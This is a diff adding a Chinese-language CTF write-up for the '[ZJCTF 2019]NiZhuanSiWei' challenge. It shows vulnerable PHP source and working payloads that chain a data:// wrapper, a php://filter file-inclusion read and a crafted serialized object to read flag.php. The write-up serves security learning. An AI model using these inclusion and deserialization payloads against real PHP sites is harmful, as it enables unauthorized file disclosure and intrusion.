@@ -419,3 +419,98 @@ class Demo {
 得到flag
 
 ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}
+
+### [ZJCTF 2019]NiZhuanSiWei
+
+```assembly
+<?php  
+$text = $_GET["text"];
+$file = $_GET["file"];
+$password = $_GET["password"];
+if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
+    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
+    if(preg_match("/flag/",$file)){
+        echo "Not now!";
+        exit(); 
+    }else{
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
+    }
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+**file_get_contents**
+
+(PHP 4 >= 4.3.0, PHP 5, PHP 7, PHP 8)
+
+file_get_contents — 将整个文件读入一个字符串
+
+#### 说明
+
+file_get_contents(
+  string `$filename`,
+  bool `$use_include_path` = **`false`**,
+  resource `$context` = ?,
+  int `$offset` = 0,
+  int `$length` = ?
+): string|false
+
+和 [file()](https://www.php.net/manual/zh/function.file.php) 一样，只除了 **file_get_contents()** 把文件读入一个字符串。将在参数 `offset` 所指定的位置开始读取长度为 `length` 的内容。如果失败，**file_get_contents()** 将返回 **`false`**。
+
+**file_get_contents()** 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。
+
+需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤，用data伪协议传参
+
+```assembly
+?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
+```
+
+接下来就是file的那个点。直接访问flag.php不能得到php的内容，因此需要利用文件包含。题目提示了useless.php，利用php伪协议读取一下useless.php:
+
+```assembly
+php://filter/read=convert.base64-encode/resource=useless.php
+```
+
+`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php`
+
+得到
+
+`PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=`
+
+```assembly
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+```
+
+本地运行
+
+```assembly
+$flag = new Flag();
+echo(serialize($flag));
+```
+
+`O:4:"Flag":1:{s:4:"file";N;}`
+
+payload
+
+`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`
+
+F12得到flag
+
+flag{befe5973-143f-4588-a7f8-59227badd67d}
